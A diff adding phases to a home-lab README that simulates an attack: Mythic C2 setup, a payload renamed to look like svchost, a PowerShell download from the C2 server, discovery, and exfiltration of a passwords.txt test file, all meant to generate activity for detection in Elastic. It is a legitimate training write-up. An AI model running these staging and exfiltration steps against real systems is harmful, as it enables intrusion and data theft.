@@ -371,7 +371,83 @@ This simulates an attacker attempting to disable security controls after gaining
 <img width="1014" height="752" alt="image" src="https://github.com/user-attachments/assets/1cc8517a-8fc2-4616-95af-36df6a415d39" />
 
 
+## Phase 4 – Command and Control (C2)
+
+For the next phase of the attack simulation, I set up **Mythic C2** using the **Apollo agent** and an HTTP C2 profile. The goal was to establish a C2 connection with the Windows victim machine and generate realistic endpoint and network activity for analysis in Elastic.
+
+First, I installed the Apollo agent:
+
+```bash
+./mythic-cli install github https://github.com/MythicAgents/Apollo.git
+```
+I then installed the HTTP C2 profile:
+
+```bash
+./mythic-cli install github https://github.com/MythicC2Profiles/http
+```
+
+Using the Mythic web interface, I created an Apollo payload and configured the callback settings to point back to my Mythic server.
+
+<img width="2326" height="1149" alt="image" src="https://github.com/user-attachments/assets/a3173865-eee9-4754-9abd-c8e323693f25" />
+
+Once the payload was generated, I downloaded it to the Mythic server and renamed it:
+
+```text
+svchost-MyDFIR.exe
+```
+
+To make the payload available to the Windows victim machine, I started a temporary Python HTTP server from the directory containing the file:
+
+```bash
+python3 -m http.server 9999
+```
+
+I also allowed port `9999` through the Mythic server's firewall:
+
+```bash
+ufw allow 9999
+```
+
+From the Windows victim machine, which I accessed through an RDP session from Kali Linux, I downloaded the payload using PowerShell:
+
+```powershell
+Invoke-WebRequest -Uri http://<MYTHIC-SERVER-IP>:9999/svchost-MyDFIR.exe -OutFile "C:\Users\Public\Downloads\svchost-MyDFIR.exe"
+```
+<img width="604" height="174" alt="image" src="https://github.com/user-attachments/assets/1d7dc4f8-9315-4af7-b443-4d9f4b2d0f40" />
 
 
+I then executed the payload on the Windows machine. This successfully established an active callback from the victim machine to the Mythic C2 server.
 
+This simulated an attacker deploying a C2 agent after gaining access to a compromised system, while also generating activity that could later be investigated using the ELK stack.
 
+## Phase 5 – C2 Activity
+
+With an active callback established, I used the Mythic C2 interface to interact remotely with the Windows victim machine.
+
+I ran basic discovery commands through the Apollo agent, including commands to identify the current user and gather information about the compromised system and its network configuration.
+
+This simulated post-compromise activity where an attacker uses an established C2 channel to gather information about the system before carrying out further actions.
+
+<img width="2555" height="777" alt="image" src="https://github.com/user-attachments/assets/41eec23a-715f-476a-9e9f-b0a1edfabe95" />
+
+## Phase 6 – Data Exfiltration
+
+For the final phase of the attack simulation, I simulated data exfiltration by retrieving a test file called `passwords.txt` from the Windows victim machine through the established Mythic C2 connection.
+
+The file was located at:
+
+```text
+C:\Users\Administrator\Documents\passwords.txt
+```
+
+Using the Mythic C2 interface, I downloaded the file with:
+
+```text
+download C:\Users\Administrator\Documents\passwords.txt
+```
+
+This simulated an attacker using an established C2 channel to retrieve data from a compromised endpoint.
+
+<img width="2317" height="706" alt="image" src="https://github.com/user-attachments/assets/40394349-351e-45d9-892d-6d0a340a71f3" />
+
+With the attack simulation complete, the activity generated across the different phases can now be investigated in Elastic, including the initial authentication activity, system enumeration, defence evasion, payload execution, C2 communication, and data exfiltration.
